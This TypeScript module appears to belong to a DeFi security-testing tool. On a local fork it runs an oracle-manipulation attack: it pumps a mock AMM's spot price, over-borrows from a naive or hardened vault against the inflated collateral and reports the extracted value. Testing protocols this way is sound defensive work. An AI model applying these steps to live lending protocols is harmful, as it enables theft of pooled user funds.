import { parseEther, maxUint256 } from "viem";
import type { AttackModule, ModuleResult, RunOptions } from "../types";
import type { ForkRunner } from "../fork";
import { deploy, deployArtifact, send, sendAbi, read, toUsd } from "../evm";
import { loadArtifact, type Artifact } from "../artifacts";

const M20 = "MockERC20.sol";
const M20N = "MockERC20";
const WAD = 10n ** 18n;

export const oracleModule: AttackModule = {
  name: "oracle-manipulation",
  async run(fork: ForkRunner, opts?: RunOptions): Promise<ModuleResult> {
    const hardened = opts?.hardened ?? false;
    const byoAmm = opts?.target?.kind === "amm" ? opts.target.artifact : undefined;
    const ammArtifact: Artifact = byoAmm ?? loadArtifact("VulnerableAMM.sol", "VulnerableAMM");
    const aAbi = ammArtifact.abi;

    const V = hardened ? "HardenedOracleVault.sol" : "NaiveOracleVault.sol";
    const VN = hardened ? "HardenedOracleVault" : "NaiveOracleVault";

    const deployer = fork.wallet(0);
    const atk = fork.wallet(1);
    const d = deployer.account.address;
    const a = atk.account.address;

    const tkn = await deploy(deployer, M20, M20N, ["TKN", "TKN"]);
    const usdc = await deploy(deployer, M20, M20N, ["USDC", "USDC"]);
    const amm = await deployArtifact(deployer, ammArtifact, [tkn, usdc]);

    await send(deployer, tkn, M20, M20N, "mint", [d, parseEther("1000")]);
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("1000")]);
    await send(deployer, tkn, M20, M20N, "approve", [amm, maxUint256]);
    await send(deployer, usdc, M20, M20N, "approve", [amm, maxUint256]);
    await sendAbi(deployer, amm, aAbi, "addLiquidity", [parseEther("100"), parseEther("100")]);

    const vault = await deploy(deployer, V, VN, [usdc, tkn, amm]);
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("100000")]);
    await send(deployer, usdc, M20, M20N, "approve", [vault, maxUint256]);
    await send(deployer, vault, V, VN, "supply", [parseEther("100000")]);

    await send(deployer, usdc, M20, M20N, "mint", [a, parseEther("10000")]);
    const before = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);

    try {
      await send(atk, usdc, M20, M20N, "approve", [amm, maxUint256]);
      await sendAbi(atk, amm, aAbi, "swap", [usdc, parseEther("900"), a]);

      const tknBal = await read<bigint>(fork, tkn, M20, M20N, "balanceOf", [a]);
      await send(atk, tkn, M20, M20N, "approve", [vault, maxUint256]);
      await send(atk, vault, V, VN, "deposit", [tknBal]);

      const price = await read<bigint>(fork, vault, V, VN, "price", []);
      const maxDebt = ((tknBal * price) / WAD) * 7000n / 10000n;
      const borrow = (maxDebt * 999n) / 1000n;
      await send(atk, vault, V, VN, "borrow", [borrow]);

      const after = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);
      const profit = after > before ? after - before : 0n;
      return {
        name: "oracle-manipulation",
        success: profit > 0n,
        extractedUsd: toUsd(profit),
        note: byoAmm
          ? "manipulated the provided pool's spot price to over-borrow against it"
          : "pumped spot price, over-borrowed against inflated collateral, drained the reserve"
      };
    } catch {
      return { name: "oracle-manipulation", success: false, extractedUsd: 0, note: "blocked by target protection" };
    }
  }
};
